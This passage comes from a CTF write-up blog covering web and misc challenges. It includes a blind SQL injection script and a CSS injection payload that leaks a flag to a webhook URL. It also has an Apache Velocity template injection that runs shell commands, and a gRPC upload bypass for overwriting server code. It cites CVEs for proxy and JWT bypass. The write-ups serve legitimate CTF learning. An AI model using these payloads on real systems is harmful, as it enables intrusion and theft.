<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests_async</span><br><span class="line">user1_id = <span class="number">3536229236652552362</span></span><br><span class="line">user1_pass = <span class="number">3014427053</span></span><br><span class="line">user2_id = <span class="number">2725506906259309759</span></span><br><span class="line">user1_hashed_prefix = <span class="string">&quot;tbl_328b62706e834f61616399736a6a1fa35da2f0a0_&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://challs.nusgreyhats.org:33333/query&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">table_name = user1_hashed_prefix</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    check = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;user_id&quot;</span>: user2_id,</span><br><span class="line">            <span class="string">&quot;query_string&quot;</span>: <span class="string">&quot;H%&#x27; AND (SELECT SUBSTRING(table_name, &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(table_name) + <span class="number">1</span>) + <span class="string">&quot;, 1) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE &#x27;&quot;</span> + user1_hashed_prefix + <span class="string">&quot;%&#x27; LIMIT 0,1) = &#x27;&quot;</span> + char + <span class="string">&quot;&#x27;; -- &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, headers=headers, data=json.dumps(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Hello&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            table_name += char</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line">            check = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: user2_id,</span><br><span class="line">    <span class="string">&quot;query_string&quot;</span>: <span class="string">&quot;&#x27; UNION SELECT * FROM &quot;</span> + table_name + <span class="string">&quot;; -- &quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, headers=headers, data=json.dumps(payload))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure>

<p>After getting the user‚Äôs secret, we can simply submit it along with the user id to get the flag.</p>
<h2 id="Beautiful-Styles"><a href="#Beautiful-Styles" class="headerlink" title="Beautiful Styles"></a>Beautiful Styles</h2><p>We see that the flag is held in <code>&lt;input id=&quot;flag&quot; value=&quot;&#123;&#123; flag &#125;&#125;&quot;&gt;</code>. We can steal this character by character using CSS:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">for <span class="selector-tag">i</span> in &quot;<span class="number">0123456789</span>ABCDEFGHIJKLMNOPQRSTUVQXYZ&#123;&#125;f&quot;:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;input[id=&quot;flag&quot;][value^=&quot;grey&#123;&#x27;</span> + i + <span class="string">&#x27;&quot;] &#123;background: url(&quot;https://webhook.site/???/?char=&#x27;</span> + i + <span class="string">&#x27;&quot;)&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>More information <a href="https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/">here</a>. I extracted the flag by hand, as scripting this challenge surely would‚Äôve taken more time.</p>
<h1 id="Misc-Challenges"><a href="#Misc-Challenges" class="headerlink" title="Misc Challenges"></a>Misc Challenges</h1><p>I‚Äôm only going to go through the relatively harder ones.</p>
<h2 id="Maze-Runner"><a href="#Maze-Runner" class="headerlink" title="Maze Runner"></a>Maze Runner</h2><p>This problem looks exactly like the one in <a href="https://www.geeksforgeeks.org/shortest-path-by-removing-k-walls/">this geeksforgeeks article</a>, so hopefully we can just repurpose their code. The maze uses thin walls, and as per <a href="https://stackoverflow.com/a/78294870">this stackoverflow answer</a>, we can simply represent the maze as a 2d array and reduce the number of steps by half later.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">c = remote(<span class="string">&#x27;challs.nusgreyhats.org&#x27;</span>,<span class="number">31112</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shortestPath</span>(<span class="params">mat, k</span>):</span><br><span class="line">    <span class="comment"># Credit to https://www.geeksforgeeks.org/shortest-path-by-removing-k-walls/</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> steps</span><br><span class="line">level = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    level += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(level)</span><br><span class="line">    c.recvuntil(<span class="string">f&#x27;<span class="subst">&#123;level&#125;</span>:\n&#x27;</span>.encode())</span><br><span class="line">    walls = <span class="string">&quot;‚îè‚îÅ‚îÉ‚ïπ‚îõ‚îì‚îó‚î£‚ïª‚îÅ‚î≥‚îª‚ïã‚î´&quot;</span></span><br><span class="line">    maze = []</span><br><span class="line">    breakable_walls = []</span><br><span class="line">    row = c.recvline().decode().strip()</span><br><span class="line">    row_decoded = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(row):</span><br><span class="line">        <span class="keyword">if</span> row[i] <span class="keyword">in</span> walls:</span><br><span class="line">            row_decoded.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row_decoded.append(<span class="number">0</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(row) <span class="keyword">and</span> row[i] <span class="keyword">in</span> walls:</span><br><span class="line">            row_decoded.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row_decoded.append(<span class="number">0</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">2</span>):  <span class="comment"># Ignore top and bottom border</span></span><br><span class="line">        row = c.recvline().decode().strip()</span><br><span class="line">        row_decoded = []</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(row):</span><br><span class="line">            <span class="keyword">if</span> row[i] <span class="keyword">in</span> walls:</span><br><span class="line">                row_decoded.append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> t % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> (<span class="number">0</span> &lt; <span class="built_in">len</span>(row_decoded) - <span class="number">1</span> &lt; <span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">1</span>):</span><br><span class="line">                    breakable_walls.append((t + <span class="number">1</span>, <span class="built_in">len</span>(row_decoded) - <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">elif</span> t % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                row_decoded.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                row_decoded.append(<span class="number">0</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(row) <span class="keyword">and</span> row[i] <span class="keyword">in</span> walls:</span><br><span class="line">                row_decoded.append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> t % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">and</span> (<span class="number">0</span> &lt; <span class="built_in">len</span>(row_decoded) - <span class="number">1</span> &lt; <span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">1</span>):</span><br><span class="line">                    breakable_walls.append((t + <span class="number">1</span>, <span class="built_in">len</span>(row_decoded) - <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                row_decoded.append(<span class="number">0</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        maze.append(row_decoded[:-<span class="number">1</span>])</span><br><span class="line">    maze = [row[<span class="number">1</span>:-<span class="number">1</span>] <span class="keyword">for</span> row <span class="keyword">in</span> maze]  <span class="comment"># Ignore left and right border</span></span><br><span class="line">    c.recvuntil(<span class="string">b&#x27;given &#x27;</span>)</span><br><span class="line">    phases = <span class="built_in">int</span>(c.recvuntil(<span class="string">b&#x27; &#x27;</span>).decode())</span><br><span class="line">    </span><br><span class="line">    start = (<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    end = (<span class="built_in">len</span>(maze) - <span class="number">2</span>, <span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">2</span>)</span><br><span class="line">    steps = <span class="built_in">int</span>(shortestPath(maze, phases) / <span class="number">2</span>)</span><br><span class="line">    c.recvuntil(<span class="string">b&#x27;escape? \n&#x27;</span>)</span><br><span class="line">    c.sendline(<span class="built_in">str</span>(steps).encode())</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Tones"><a href="#Tones" class="headerlink" title="Tones"></a>Tones</h2><p>Opening up the wav files in audacity and viewing the spectrograms, we can deduce two things:</p>
<ol>
<li>Each character is encoded into 3 notes.</li>
<li>There are 7 unique discrete notes.</li>
</ol>
<p>This screams base7 encoding, and it was. Simply decoding the frequencies by setting the lowest frequency to 0 and the highest to 6 gives us the flag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">205 222 203 232 234 230 206 232 164 224 206 102 164 106 204 223 212 164 204 222 102 221 225 102 215 201 232 164 223 206 100 204 224 164 066 102 103 111 211 204 066 203 222 211 204 111 211 202 223 205 202 204 205 236</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grey&#123;why_th3_7fsk_fr3qu3ncy_sh1ft_0349jf0erjf9jdsgdfg&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Verilog-Count"><a href="#Verilog-Count" class="headerlink" title="Verilog Count"></a>Verilog Count</h2><p>The server asks you for a Verilog script, but the issue is that a few keywords are banned: <code>if</code>, <code>else</code>, <code>?</code>, and <code>+</code>. This means that simple addition and conditionals are out of the gate.</p>
<p>This was my first time touching Verilog. From my experience in digital electronics, I knew that what I needed was a ripple carry counter, which is a line of flip-flops through which the clock pulse gets carried. More information <a href="https://www.javatpoint.com/ripple-counter-in-digital-electronics">here</a>. Only problem now was that I needed to know how to write in Verilog.</p>
<p>It took me ages to learn what I needed to learn, but my final <code>solve.v</code> is below. I‚Äôll go through a few problems I experienced further down.</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> counter</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">input</span> clk,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">31</span>:<span class="number">0</span>] q</span><br><span class="line">);</span><br><span class="line">	<span class="keyword">logic</span> reset;</span><br><span class="line">	<span class="keyword">initial</span> <span class="keyword">begin</span></span><br><span class="line">		reset = <span class="number">1&#x27;b1</span>;</span><br><span class="line">		#<span class="number">1</span>;</span><br><span class="line">		reset = <span class="number">1&#x27;b0</span>;</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">    t_ff tff0(q[<span class="number">0</span>], !clk, reset);</span><br><span class="line">	t_ff tff1(q[<span class="number">1</span>], q[<span class="number">0</span>], reset);</span><br><span class="line">	t_ff tff2(q[<span class="number">2</span>], q[<span class="number">1</span>], reset);</span><br><span class="line">	t_ff tff3(q[<span class="number">3</span>], q[<span class="number">2</span>], reset);</span><br><span class="line">	t_ff tff4(q[<span class="number">4</span>], q[<span class="number">3</span>], reset);</span><br><span class="line">	t_ff tff5(q[<span class="number">5</span>], q[<span class="number">4</span>], reset);</span><br><span class="line">	t_ff tff6(q[<span class="number">6</span>], q[<span class="number">5</span>], reset);</span><br><span class="line">	t_ff tff7(q[<span class="number">7</span>], q[<span class="number">6</span>], reset);</span><br><span class="line">	t_ff tff8(q[<span class="number">8</span>], q[<span class="number">7</span>], reset);</span><br><span class="line">	t_ff tff9(q[<span class="number">9</span>], q[<span class="number">8</span>], reset);</span><br><span class="line">	t_ff tff10(q[<span class="number">10</span>], q[<span class="number">9</span>], reset);</span><br><span class="line">	t_ff tff11(q[<span class="number">11</span>], q[<span class="number">10</span>], reset);</span><br><span class="line">	t_ff tff12(q[<span class="number">12</span>], q[<span class="number">11</span>], reset);</span><br><span class="line">	t_ff tff13(q[<span class="number">13</span>], q[<span class="number">12</span>], reset);</span><br><span class="line">	t_ff tff14(q[<span class="number">14</span>], q[<span class="number">13</span>], reset);</span><br><span class="line">	t_ff tff15(q[<span class="number">15</span>], q[<span class="number">14</span>], reset);</span><br><span class="line">	t_ff tff16(q[<span class="number">16</span>], q[<span class="number">15</span>], reset);</span><br><span class="line">	t_ff tff17(q[<span class="number">17</span>], q[<span class="number">16</span>], reset);</span><br><span class="line">	t_ff tff18(q[<span class="number">18</span>], q[<span class="number">17</span>], reset);</span><br><span class="line">	t_ff tff19(q[<span class="number">19</span>], q[<span class="number">18</span>], reset);</span><br><span class="line">	t_ff tff20(q[<span class="number">20</span>], q[<span class="number">19</span>], reset);</span><br><span class="line">	t_ff tff21(q[<span class="number">21</span>], q[<span class="number">20</span>], reset);</span><br><span class="line">	t_ff tff22(q[<span class="number">22</span>], q[<span class="number">21</span>], reset);</span><br><span class="line">	t_ff tff23(q[<span class="number">23</span>], q[<span class="number">22</span>], reset);</span><br><span class="line">	t_ff tff24(q[<span class="number">24</span>], q[<span class="number">23</span>], reset);</span><br><span class="line">	t_ff tff25(q[<span class="number">25</span>], q[<span class="number">24</span>], reset);</span><br><span class="line">	t_ff tff26(q[<span class="number">26</span>], q[<span class="number">25</span>], reset);</span><br><span class="line">	t_ff tff27(q[<span class="number">27</span>], q[<span class="number">26</span>], reset);</span><br><span class="line">	t_ff tff28(q[<span class="number">28</span>], q[<span class="number">27</span>], reset);</span><br><span class="line">	t_ff tff29(q[<span class="number">29</span>], q[<span class="number">28</span>], reset);</span><br><span class="line">	t_ff tff30(q[<span class="number">30</span>], q[<span class="number">29</span>], reset);</span><br><span class="line">	t_ff tff31(q[<span class="number">31</span>], q[<span class="number">30</span>], reset);</span><br><span class="line"><span class="keyword">endmodule</span></span><br><span class="line"><span class="keyword">module</span> t_ff</span><br><span class="line">(</span><br><span class="line">        q,</span><br><span class="line">        clk,</span><br><span class="line">        rst</span><br><span class="line">);</span><br><span class="line"><span class="keyword">output</span>  q;</span><br><span class="line"><span class="keyword">input</span>   clk;</span><br><span class="line"><span class="keyword">input</span>   rst;</span><br><span class="line"><span class="keyword">wire</span>    d;</span><br><span class="line">d_ff dff0(q, d, clk, rst);</span><br><span class="line"><span class="keyword">not</span> n1(d, q);</span><br><span class="line"><span class="keyword">endmodule</span></span><br><span class="line"><span class="keyword">module</span> d_ff</span><br><span class="line">(</span><br><span class="line">        q,</span><br><span class="line">        d,</span><br><span class="line">        clk,</span><br><span class="line">        rst</span><br><span class="line">);</span><br><span class="line"><span class="keyword">output</span>  q;</span><br><span class="line"><span class="keyword">input</span>   d;</span><br><span class="line"><span class="keyword">input</span>   clk;</span><br><span class="line"><span class="keyword">input</span>   rst;</span><br><span class="line"><span class="keyword">reg</span>     q;</span><br><span class="line"><span class="keyword">always</span> @ (<span class="keyword">negedge</span> clk <span class="keyword">or</span> <span class="keyword">posedge</span> rst)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">        q &lt;= (~rst &amp; d) | (rst &amp; <span class="number">1&#x27;b0</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>

<p>In the <code>initial begin</code> block in the <code>counter</code> module, I initially had <code>reset = 1&#39;b1;</code>, and <code>reset = 1&#39;b0</code> was after the T-flip-flop calls. This gave me a counter, but it didn‚Äôt incrememt on the first clock cycle. After some debugging, I found out that it was because the <code>reset</code> signal is set to <code>1&#39;b1</code> at the beginning and then immediately set to <code>1&#39;b0</code> on the first positive edge of the clock, meaning that the counter is effectively reset on the first clock cycle.</p>
<p>There was also the issue of not using any conditional statements, which I needed for the D-flip-flop. This issue was a lot simpler as we can use the <code>AND</code> operation to select between the two values based on the <code>reset</code> signal.</p>
<h1 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h1><p>Great CTF, excited for finals.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB Cyber Apocalypse CTF 2024 Web Writeups</title>
    <url>/2024/03/15/htb-2024/</url>
    <content><![CDATA[<p>This CTF happened during my midterms and I didn‚Äôt really have the luxury of time to look at some of the later challenges. I participated under team youtiaos, and we ended 97th place out of 5694 teams.</p>
<h2 id="Lightning-Round"><a href="#Lightning-Round" class="headerlink" title="Lightning Round"></a>Lightning Round</h2><p>TimeKORP - Trivial command injection in format parameter<br>KORP terminal - SQLmap + bcrypt hash cracking</p>
<h2 id="Labyrinth-Linguist"><a href="#Labyrinth-Linguist" class="headerlink" title="Labyrinth Linguist"></a>Labyrinth Linguist</h2><p>We‚Äôre given a Java application using the Apache Velocity templating engine. We have user controlled input via <code>textString</code> that we can inject Velocity templates into.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">t.setData(runtimeServices.parse(reader, <span class="string">&quot;home&quot;</span>));</span><br><span class="line">t.initDocument();</span><br><span class="line"><span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">context.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;World&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">t.merge(context, writer);</span><br><span class="line">template = writer.toString();</span><br></pre></td></tr></table></figure>

<p><code>context.put(&quot;name&quot;, &quot;World&quot;);</code> is the key here. Exclusion of this line would make RCE a lot harder, but since we have this object in our context we can simply access the Java <code>Class</code> object through <code>.getClass()</code>. We can therefore inject:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($str=$name.getClass().forName(&quot;java.lang.String&quot;))</span><br><span class="line">#set($chr=$name.getClass().forName(&quot;java.lang.Character&quot;))</span><br><span class="line">#set($ex=$name.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cat ../flag.txt&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>

<p>to read the flag.</p>
<h2 id="LockTalk"><a href="#LockTalk" class="headerlink" title="LockTalk"></a>LockTalk</h2><p>We‚Äôre given a Flask application through HAProxy. The flag is accessible through <code>/flag</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api_blueprint.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@authorize_roles(<span class="params">[<span class="string">&#x27;administrator&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: current_app.config.get(<span class="string">&#x27;FLAG&#x27;</span>)&#125;), <span class="number">200</span></span><br></pre></td></tr></table></figure>

<p>The <code>authorize_roles</code> decorator is as shown:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">authorize_roles</span>(<span class="params">roles</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">        @wraps(<span class="params">func</span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;JWT token is missing or invalid.&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                token = jwt.verify_jwt(token, current_app.config.get(<span class="string">&#x27;JWT_SECRET_KEY&#x27;</span>), [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">                user_role = token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> user_role <span class="keyword">not</span> <span class="keyword">in</span> roles:</span><br><span class="line">                    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;user_role&#125;</span> user does not have the required authorization to access the resource.&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;JWT token verification failed.&#x27;</span>, <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure>

<p>There are two things in our way.</p>
<p>Firstly, HAProxy here acts as a firewall and prevents all requests to the API.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frontend haproxy</span><br><span class="line">    bind 0.0.0.0:1337</span><br><span class="line">    default_backend backend</span><br><span class="line"></span><br><span class="line">    http-request deny if &#123; path_beg,url_dec -i /api/v1/get_ticket &#125;</span><br></pre></td></tr></table></figure>

<p>Looking at the dockerfile however, we can see that a specific version of HAProxy is being used:</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz</span></span><br></pre></td></tr></table></figure>

<p>Simply using <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-45539">CVE-2023-45539</a> will allow us to bypass the firewall.</p>
<p>Second is the JWT verification. Unfortunately, looking at <code>requirements.txt</code>, they‚Äôre install a specific version of python_jwt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python_jwt==3.3.3</span><br></pre></td></tr></table></figure>

<p>Using <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39227">CVE-2022-39227</a> will allow us to bypass authentication and masquerade as an administrator.</p>
<h2 id="Testimonial"><a href="#Testimonial" class="headerlink" title="Testimonial"></a>Testimonial</h2><p>We‚Äôre given a golang application with file upload using gRPC. Flag is in the root directory. Both the application and the gRPC Ricky server are exposed. Air is used to live-reload the application.</p>
<p>Intuitively, if the file upload is insecure, we can overwrite an application file with a malicious script that reads the flag file and reload the application to reflect our changes.</p>
<p>The client filters the uploaded file name on the client:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> SendTestimonial(customer, testimonial <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	<span class="comment">// Filter bad characters.</span></span><br><span class="line">	<span class="keyword">for</span> _, char := <span class="keyword">range</span> []<span class="type">string</span>&#123;<span class="string">&quot;/&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;.&quot;</span>&#125; &#123;</span><br><span class="line">		customer = strings.ReplaceAll(customer, char, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err := c.SubmitTestimonial(ctx, &amp;pb.TestimonialSubmission&#123;Customer: customer, Testimonial: testimonial&#125;)</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can easily bypass the check by communicating directly with the gRPC server.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sol/pb&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    serverAddr := <span class="string">&quot;grpcserver:port&quot;</span></span><br><span class="line"></span><br><span class="line">    conn, err := grpc.Dial(serverAddr, grpc.WithInsecure())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Failed to connect: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    client := pb.NewRickyServiceClient(conn)</span><br><span class="line"></span><br><span class="line">    customer := <span class="string">&quot;uploaded_filename&quot;</span></span><br><span class="line">	fileContent, err := os.ReadFile(<span class="string">&quot;local_copy_of_file&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Error reading file: %v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	testimonial := <span class="type">string</span>(fileContent)</span><br><span class="line"></span><br><span class="line">    err = sendTestimonial(client, customer, testimonial)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Failed to send: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Win&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendTestimonial</span><span class="params">(client pb.RickyServiceClient, customer, testimonial <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    _, err := client.SubmitTestimonial(ctx, &amp;pb.TestimonialSubmission&#123;</span><br><span class="line">        Customer:    customer,</span><br><span class="line">        Testimonial: testimonial,</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> err </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can iteratively search for a useful file we have permissions to overwrite, and home.go serves that purpose.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleHomeIndex</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	customer := r.URL.Query().Get(<span class="string">&quot;customer&quot;</span>)</span><br><span class="line">	testimonial := <span class="string">&quot;&quot;</span></span><br><span class="line">	</span><br><span class="line">	files, err := ioutil.ReadDir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		testimonial = <span class="string">&quot;Error reading root directory&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> testimonial == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">			<span class="keyword">if</span> filepath.Ext(file.Name()) == <span class="string">&quot;.txt&quot;</span> &#123;</span><br><span class="line">				content, err := ioutil.ReadFile(filepath.Join(<span class="string">&quot;/&quot;</span>, file.Name()))</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Printf(<span class="string">&quot;Error reading file %s: %v\n&quot;</span>, file.Name(), err)</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">				&#125;</span><br><span class="line">				testimonial += <span class="type">string</span>(content)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> customer != <span 